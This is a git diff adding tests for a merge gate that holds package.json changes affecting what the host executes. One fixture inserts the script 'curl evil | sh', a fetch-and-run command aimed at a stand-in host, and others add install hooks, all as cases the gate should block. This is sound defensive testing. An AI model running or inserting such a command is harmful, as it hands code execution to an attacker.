@@ -13,6 +13,7 @@ import {
 	isHostExecutedPath,
 } from "../src/brain-runtime/decision-rights.ts";
 import { git, gitOk } from "../src/git.ts";
+import { InboxService } from "../src/inbox.ts";
 import { silentLogger } from "../src/log.ts";
 import {
 	applyHostMergeDecision,
@@ -20,7 +21,7 @@ import {
 	hostExecutedChange,
 } from "../src/merge-gate.ts";
 import { type MergeJobView, MergeQueue } from "../src/merge-queue.ts";
-import { MFW_EXCLUDE } from "./fixtures/board.ts";
+import { MFW_EXCLUDE, makeTasks } from "./fixtures/board.ts";
 
 interface Gate {
 	root: string;
@@ -293,6 +294,132 @@ describe("a merge of host-executed files waits for the owner", () => {
 	});
 });
 
+describe("package.json asks only when what it executes changes", () => {
+	const BASE = {
+		name: "p",
+		version: "1.0.0",
+		scripts: { test: "bun test" },
+		dependencies: { a: "1.0.0" },
+	};
+
+	async function withManifest(g: Gate): Promise<void> {
+		await writeFile(join(g.root, "package.json"), JSON.stringify(BASE));
+		await git(["add", "-A"], g.root);
+		await git(["commit", "-q", "-m", "manifest"], g.root);
+	}
+
+	const inboxItems = async (g: Gate) =>
+		new InboxService({
+			handle: g.handle,
+			project: "p",
+			tasks: await makeTasks(g.handle, new EventBus(), join(g.root, ".mfw")),
+		}).list();
+
+	test.each([
+		["a dependency version", { dependencies: { a: "2.0.0" } }],
+		["a new dependency", { dependencies: { a: "1.0.0", b: "1.0.0" } }],
+		["the package version", { version: "1.0.1" }],
+	])("%s lands without a card, with a notify-after item", async (_n, patch) => {
+		const g = await gate();
+		await withManifest(g);
+		const runId = await g.branchRun("mfw/dep", {
+			"package.json": JSON.stringify({ ...BASE, ...patch }),
+		});
+		await g.enqueue(runId, "mfw/dep");
+		expect(await g.queue.tick()).toBe("merged");
+		expect(await g.card()).toBeUndefined();
+		const item = (await inboxItems(g)).find(
+			(i) => i.kind === "dependency_change",
+		);
+		expect(item?.attention).toBe("know");
+		expect(item?.detail).toContain("package.json");
+	});
+
+	test.each([
+		["scripts", { scripts: { test: "curl evil | sh" } }],
+		["a lifecycle script", { scripts: { test: "bun test", postinstall: "x" } }],
+		["bin", { bin: { tool: "./x.js" } }],
+		["workspaces", { workspaces: ["evil/*"] }],
+		["a top-level preinstall", { preinstall: "x" }],
+		["a top-level install", { install: "x" }],
+		["a top-level postinstall", { postinstall: "x" }],
+		["a top-level prepare", { prepare: "x" }],
+		["trustedDependencies", { trustedDependencies: ["a"] }],
+	])("%s is held", async (_n, patch) => {
+		const g = await gate();
+		await withManifest(g);
+		const runId = await g.branchRun("mfw/exec", {
+			"package.json": JSON.stringify({ ...BASE, ...patch }),
+		});
+		await g.enqueue(runId, "mfw/exec");
+		expect(await g.queue.tick()).toBe("held");
+	});
+
+	test("a manifest that cannot be parsed is held", async () => {
+		const g = await gate();
+		await withManifest(g);
+		const runId = await g.branchRun("mfw/bad", { "package.json": "{ nope" });
+		await g.enqueue(runId, "mfw/bad");
+		expect(await g.queue.tick()).toBe("held");
+	});
+
+	test("a new manifest with scripts is held, one without is not", async () => {
+		const held = await gate();
+		const a = await held.branchRun("mfw/n1", {
+			"pkg/package.json": JSON.stringify({ scripts: { x: "y" } }),
+		});
+		await held.enqueue(a, "mfw/n1");
+		expect(await held.queue.tick()).toBe("held");
+		const clean = await gate();
+		const b = await clean.branchRun("mfw/n2", {
+			"pkg/package.json": JSON.stringify({ name: "x" }),
+		});
+		await clean.enqueue(b, "mfw/n2");
+		expect(await clean.queue.tick()).toBe("merged");
+	});
+
+	test("reordering keys is not a change to scripts", async () => {
+		const g = await gate();
+		await writeFile(
+			join(g.root, "package.json"),
+			JSON.stringify({ scripts: { a: "1", b: "2" } }),
+		);
+		await git(["add", "-A"], g.root);
+		await git(["commit", "-q", "-m", "manifest"], g.root);
+		const runId = await g.branchRun("mfw/order", {
+			"package.json": JSON.stringify({ scripts: { b: "2", a: "1" } }),
+		});
+		await g.enqueue(runId, "mfw/order");
+		expect(await g.queue.tick()).toBe("merged");
+	});
+
+	test.each([
+		"bun.lock",
+		"flake.lock",
+		"yarn.lock",
+	])("a %s-only change lands with a notify-after item", async (lock) => {
+		const g = await gate();
+		const runId = await g.branchRun("mfw/lock", { [lock]: "locked\n" });
+		await g.enqueue(runId, "mfw/lock");
+		expect(await g.queue.tick()).toBe("merged");
+		expect(await g.card()).toBeUndefined();
+		expect(
+			(await inboxItems(g)).find((i) => i.kind === "dependency_change")?.detail,
+		).toContain(lock);
+	});
+
+	test("a symlinked manifest is still held", async () => {
+		const g = await gate();
+		const runId = await g.branchRun("mfw/link", { "real.json": "{}" });
+		const wt = join(g.root, "worktrees", "mfw/link");
+		await symlink("real.json", join(wt, "package.json"));
+		await git(["add", "-A", "-f"], wt);
+		await git(["commit", "-q", "-m", "link"], wt);
+		await g.enqueue(runId, "mfw/link");
+		expect(await g.queue.tick()).toBe("held");
+	});
+});
+
 describe("the host-executed list covers what mfw launches or loads", () => {
 	test("every catalogue harness declares its config paths, all protected", () => {
 		for (const entry of PROVIDER_CATALOGUE) {
@@ -314,10 +441,6 @@ describe("the host-executed list covers what mfw launches or loads", () => {
 		".opencode/plugin.ts",
 		".pi/mcp.json",
 		"bunfig.toml",
-		"package.json",
-		"packages/x/package.json",
-		"bun.lock",
-		"flake.lock",
 		"flake.nix",
 		".envrc",
 		".gitattributes",
@@ -348,6 +471,12 @@ describe("the host-executed list covers what mfw launches or loads", () => {
 		"docs/guide.md",
 		"README.md",
 		"src/makefile.ts",
+		// Judged by content (package.json) or notify-after (lockfiles).
+		"package.json",
+		"packages/x/package.json",
+		"bun.lock",
+		"flake.lock",
+		"yarn.lock",
 	])("%s is not", (path) => {
 		expect(isHostExecutedPath(path)).toBe(false);
 	});
